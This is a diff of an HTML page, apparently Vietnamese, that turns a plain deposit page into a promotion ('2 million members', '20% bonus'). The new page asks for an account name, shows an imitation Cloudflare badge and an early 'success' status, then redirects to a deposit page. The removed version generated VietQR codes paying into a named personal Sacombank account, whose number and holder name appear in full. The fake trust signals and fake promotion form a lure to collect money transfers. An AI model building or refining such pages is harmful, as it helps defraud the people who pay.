@@ -1,110 +1,251 @@
-https://vietqr.app/img?bank=Sacombank&acc=070137130244&template=standard&amount=300000&holder=LE%20GIA%20KIET<!DOCTYPE html>
+<!doctype html>
 <html lang="vi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trang nạp tiền</title>
-
-    <style>
-        body {
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background: #f2f2f2;
-        }
-
-        .box {
-            max-width: 420px;
-            margin: 50px auto;
-            background: white;
-            padding: 25px;
-            border-radius: 20px;
-            text-align: center;
-            box-shadow: 0 5px 20px #ccc;
-        }
-
-        h1 {
-            color: #222;
-        }
-
-        input {
-            width: 100%;
-            padding: 14px;
-            box-sizing: border-box;
-            border: 1px solid #ddd;
-            border-radius: 10px;
-            font-size: 16px;
-            margin: 15px 0;
-        }
-
-        button {
-            width: 100%;
-            padding: 14px;
-            background: #1677ff;
-            color: white;
-            border: 0;
-            border-radius: 10px;
-            font-size: 17px;
-            cursor: pointer;
-        }
-
-        #qr {
-            margin-top: 20px;
-        }
-
-        #qr img {
-            width: 280px;
-            max-width: 100%;
-        }
-    </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Đại tiệc chào mừng 2 triệu thành viên</title>
+<style>
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{
+  background:#004f49;
+  font-family:Arial,Helvetica,sans-serif;
+}
+.page{
+  width:min(100%,390px);
+  min-height:100vh;
+  margin:auto;
+  padding:0 10px 8px;
+  background:#00534d;
+  overflow:hidden;
+}
+.logo{
+  display:block;
+  width:245px;
+  max-width:90%;
+  margin:0 auto -5px;
+  object-fit:contain;
+}
+.card{
+  background:#0b927f;
+  border-radius:30px;
+  min-height:444px;
+  padding:105px 5px 55px;
+}
+.badge{
+  width:max-content;
+  max-width:94%;
+  margin:0 auto 28px;
+  padding:11px 15px;
+  border-radius:25px;
+  background:#087f70;
+  color:#ffd43d;
+  font-size:13px;
+  font-weight:800;
+  text-align:center;
+}
+.title{
+  text-align:center;
+  color:#fff;
+  font-size:15px;
+  font-weight:800;
+  margin-bottom:14px;
+}
+.searchbox{
+  position:relative;
+  margin:0;
+}
+.searchbox input{
+  display:block;
+  width:100%;
+  height:51px;
+  border:0;
+  outline:0;
+  border-radius:28px;
+  padding:0 57px 0 14px;
+  background:#f5f5f5;
+  color:#222;
+  font-size:16px;
+}
+.searchbox input::placeholder{color:#333;opacity:1}
+.clear{
+  position:absolute;
+  top:50%;
+  right:38px;
+  transform:translateY(-50%);
+  width:15px;
+  height:15px;
+  border:0;
+  border-radius:50%;
+  padding:0;
+  background:#888;
+  color:#fff;
+  font-size:12px;
+  line-height:15px;
+  cursor:pointer;
+}
+.searchIcon{
+  position:absolute;
+  top:50%;
+  right:13px;
+  width:16px;
+  height:16px;
+  transform:translateY(-60%);
+  border:2px solid #111;
+  border-radius:50%;
+}
+.searchIcon:after{
+  content:"";
+  position:absolute;
+  width:7px;
+  height:2px;
+  right:-5px;
+  bottom:-3px;
+  background:#111;
+  transform:rotate(45deg);
+  border-radius:2px;
+}
+.status{
+  position:relative;
+  margin:20px 12px 21px;
+  height:42px;
+  border-radius:24px;
+  background:#fff;
+  overflow:hidden;
+  color:#666;
+  display:flex;
+  align-items:center;
+  padding:0 12px;
+  font-size:13px;
+}
+.status .dot{
+  width:7px;height:7px;border-radius:50%;
+  background:#111;
+  margin-left:auto;
+  margin-right:12px;
+}
+.status .cf{
+  position:absolute;
+  right:-2px;
+  top:4px;
+  color:#f36b1b;
+  font-size:10px;
+  font-weight:900;
+}
+.status .privacy{
+  position:absolute;
+  right:2px;
+  bottom:2px;
+  color:#aaa;
+  font-size:9px;
+}
+.check{
+  display:block;
+  margin:0 auto;
+  min-width:161px;
+  height:48px;
+  padding:0 20px;
+  border:0;
+  border-radius:28px;
+  background:#079bd8;
+  color:#fff;
+  font-size:13px;
+  font-weight:900;
+  cursor:pointer;
+  box-shadow:0 3px 0 #087eb1;
+}
+.check:active{
+  transform:translateY(2px);
+  box-shadow:0 1px 0 #087eb1;
+}
+.banner{
+  display:block;
+  width:100%;
+  margin:95px auto 0;
+  object-fit:contain;
+}
+.message{
+  min-height:18px;
+  margin:9px 0 0;
+  text-align:center;
+  color:#cceee9;
+  font-size:11px;
+}
+@media(max-width:350px){
+  .card{padding-top:92px}
+  .banner{margin-top:80px}
+}
+</style>
 </head>
-
 <body>
 
-<div class="box">
+<main class="page">
+  <img class="logo" src="logo.png" alt="Đại tiệc chào mừng 2 triệu thành viên">
 
-    <h1>💰 NẠP TIỀN</h1>
+  <section class="card">
+    <div class="badge">ĐẠI TIỆC THÁNG 8 KM 20% GIÁ TRỊ!</div>
 
-    <p>Nhập số tiền cần chuyển</p>
+    <div class="title">Nhập tên tài khoản</div>
 
-    <input
-        type="number"
-        id="amount"
-        placeholder="Nhập số tiền"
-    >
+    <div class="searchbox">
+      <input id="username" type="text" placeholder="Search here" autocomplete="off">
+      <button class="clear" type="button" onclick="clearName()">×</button>
+      <span class="searchIcon"></span>
+    </div>
 
-    <button onclick="taoQR()">
-        TẠO MÃ QR
+    <div class="status">
+      <span id="statusText">Thành công!</span>
+      <span class="dot"></span>
+      <span class="cf">CLOUDFLARE</span>
+      <span class="privacy">Privacy - Terms</span>
+    </div>
+
+    <button class="check" type="button" onclick="goToPayment()">
+      KIỂM TRA NGAY
     </button>
 
-    <div id="qr"></div>
+    <div class="message" id="message"></div>
+  </section>
 
-</div>
+  <img class="banner" src="banner.png" alt="Thông tin sự kiện">
+
+</main>
 
 <script>
+/*
+  ==============================
+  ĐỔI LINK TRANG NẠP TIỀN Ở ĐÂY
+  ==============================
+*/
+const PAYMENT_URL = "nap-tien.html";
 
-function taoQR() {
-
-    let amount = document.getElementById("amount").value;
-
-    if (amount == "" || amount < 1000) {
-        alert("Vui lòng nhập số tiền!");
-        return;
-    }
-
-    let qr =
-        "https://vietqr.app/img" +
-        "?bank=Sacombank" +
-        "&acc=070137130244" +
-        "&template=standard" +
-        "&amount=" + amount +
-        "&holder=LE%20GIA%20KIET";
-
-    document.getElementById("qr").innerHTML =
-        "<img src='" + qr + "'>";
-
+function clearName(){
+  document.getElementById("username").value = "";
+  document.getElementById("message").textContent = "";
 }
 
+function goToPayment(){
+  const username = document.getElementById("username").value.trim();
+
+  if(!username){
+    document.getElementById("message").textContent =
+      "Vui lòng nhập tên tài khoản.";
+    document.getElementById("username").focus();
+    return;
+  }
+
+  document.getElementById("statusText").textContent = "Đang kiểm tra...";
+  document.getElementById("message").textContent = "";
+
+  // Sau khi kiểm tra, chuyển sang trang nạp tiền.
+  setTimeout(function(){
+    window.location.href =
+      PAYMENT_URL + "?username=" + encodeURIComponent(username);
+  }, 500);
+}
 </script>
 
 </body>
 </html>
+index.html
+HTML
